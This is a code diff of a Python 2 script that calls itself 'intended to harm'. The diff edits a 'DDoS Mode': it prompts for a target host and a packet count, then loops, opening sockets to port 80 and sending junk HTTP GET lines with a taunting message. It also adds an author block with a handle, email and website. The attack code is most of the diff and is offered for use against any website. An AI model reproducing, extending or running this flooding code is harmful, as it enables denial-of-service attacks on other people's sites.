@@ -1,10 +1,25 @@
 #usr/bin/python
+#+------------------------------------------------+
+#|Please note that this code is intended to harm. |
+#|Please use with CAUTION!					      |	
+#|Use of this script is beyond the developer.     |
+#|@strrrry is the author					      |	
+#+------------------------------------------------+
 """
 """
 import time, socket, os, sys, string, random, subprocess
+import httplib, socket
 from flask import Flask
 from colorama import *
 init()
+
+#author's info
+class author(object):		
+	def __init__(self):
+		self.__name = 'Abrupt'
+		self.__author = '@strrrry'
+		self.__email = 'zeekthegeek291@gamil.com'
+		self.__website = 'http://abrupt.github.io/'
 
 # generates a user agent array
 def user_agent():
@@ -56,32 +71,35 @@ def main():
         print
 
         if choice == '1':
-        	print ("[!] DDoS Mode Loaded")
+        	print ("[!] DDoS Mode Loading")
+        	time.sleep(3)
         	#params for dos
-        	host = raw_input('Website to DDoS: ')
+        	host = raw_input('Host: ')	
+        	host = host.replace("http://","")
         	port = 80
         	conn = raw_input("Number of Packets: ")
+        	print("<--Loading DDoS Attack-->")
+        	time.sleep(4)
         	message = "#strrrry is an eGod"
-        	ip = socket.gethostbyname( host )
+        	ip = socket.gethostbyname(host)
 
-        	def dos_it():
+        	def ddos_run():
         		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         		try:
         			#start ddos attack
-        			ddos.connect((host, 80))
-        			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+        			ddos.connect((host, port))
         			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
 			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
-			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
-			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
 			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
         		except socket.error, msg:
-        			print("[!] [Connection Failed]")
-        		print("[" + time.ctime(time.time()) + "]" + " [DDoS Attack Serving on port: %s..]" % port)
+        			print("\n\t[!] [Connection Failed]")
+        			exit()
+        		print("[" + time.ctime(time.time()) + "]" + " [Attack Serving on port: %s]" % port)
+        		print ("[%s]" % ip)
         		ddos.close()
-        	
+
         	for i in xrange(int(conn)):
-        		dos_it()
+        		ddos_run()
 
         if choice == '2':
         	#Run webgui
